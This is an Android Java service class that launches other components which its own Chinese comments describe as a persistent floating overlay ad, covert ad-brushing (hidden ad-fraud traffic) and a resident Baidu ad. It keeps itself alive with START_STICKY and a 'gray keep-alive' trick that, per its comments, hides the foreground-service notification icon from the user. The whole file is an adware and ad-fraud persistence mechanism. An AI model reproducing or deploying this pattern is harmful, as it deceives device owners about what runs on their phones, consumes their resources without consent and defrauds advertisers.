package dlg.lizhihao.com.mobilezausap;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import dlg.lizhihao.com.mobilezausap.SlGeneral.MyService;
import dlg.lizhihao.com.mobilezausap.floatGeneral.ResidentService;
import dlg.lizhihao.com.mobilezausap.floatGeneral.baidu.BaiduResidentService;

public class ZausService extends Service {
    public ZausService() {
    }
    private final static int GRAY_SERVICE_ID = 1001;
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onCreate() {
        super.onCreate();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startService(new Intent(this,ResidentService.class));//开启常驻悬浮窗广告
        startService(new Intent(this, MyService.class));//开启暗刷
        startService(new Intent(this, BaiduResidentService.class));//开启百度常驻广告
        flags = Service.START_STICKY;
        if (Build.VERSION.SDK_INT < 18) {
            startForeground(GRAY_SERVICE_ID, new Notification());//API < 18 ，此方法能有效隐藏Notification上的图标
        } else {
            Intent innerIntent = new Intent(this, ZausService.GrayInnerService.class);
            startService(innerIntent);
            startForeground(GRAY_SERVICE_ID, new Notification());
        }
        return super.onStartCommand(intent, flags, startId);
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    /**
     * 给 API >= 18 的平台上用的灰色保活手段
     */
    public static class GrayInnerService extends Service {
        @Override
        public void onCreate() {
            super.onCreate();
        }
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startForeground(GRAY_SERVICE_ID, new Notification());
            stopForeground(true);
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }
        @Override
        public IBinder onBind(Intent intent) {
            // TODO: Return the communication channel to the service.
            throw new UnsupportedOperationException("Not yet implemented");
        }
        @Override
        public void onDestroy() {
            super.onDestroy();
        }
    }

}
